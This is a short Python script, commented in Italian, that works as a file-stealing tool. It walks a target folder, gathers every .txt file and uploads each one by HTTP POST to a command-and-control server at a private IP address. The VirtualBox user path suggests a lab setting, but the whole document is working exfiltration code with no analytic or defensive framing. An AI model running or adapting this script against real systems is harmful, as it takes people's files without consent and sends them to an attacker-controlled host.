import os
import requests

# Configura il server C2 (modifica con il tuo IP)
C2_URL = "http://10.0.2.15:5000/upload"  # L'IP del server Flask dove ricevi i file

# Directory contenente i file da rubare
TARGET_DIR = r"C:\Users\vboxuser\Desktop\prova"  # Cambia il percorso della cartella

def find_txt_files(directory):
    """Trova i file .txt nella cartella specificata."""
    files_to_steal = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".txt"):  # Filtra i file con estensione .txt
                files_to_steal.append(os.path.join(root, file))
    return files_to_steal

def send_file(file_path):
    """Invia il file al server C2."""
    with open(file_path, 'rb') as file:
        # Invia il file al server Flask
        files = {'file': (os.path.basename(file_path), file)}
        response = requests.post(C2_URL, files=files)
        return response.status_code

if __name__ == "__main__":
    # Trova i file da rubare
    files = find_txt_files(TARGET_DIR)
    print(f"Trovati {len(files)} file da rubare.")

    if files:
        # Invia ciascun file al server
        for file in files:
            print(f"Inviando {file}...")
            status = send_file(file)
            if status == 200:
                print(f"File {file} inviato con successo.")
            else:
                print(f"Errore durante l'invio di {file}: {status}")
    else:
        print("Nessun file .txt trovato.")
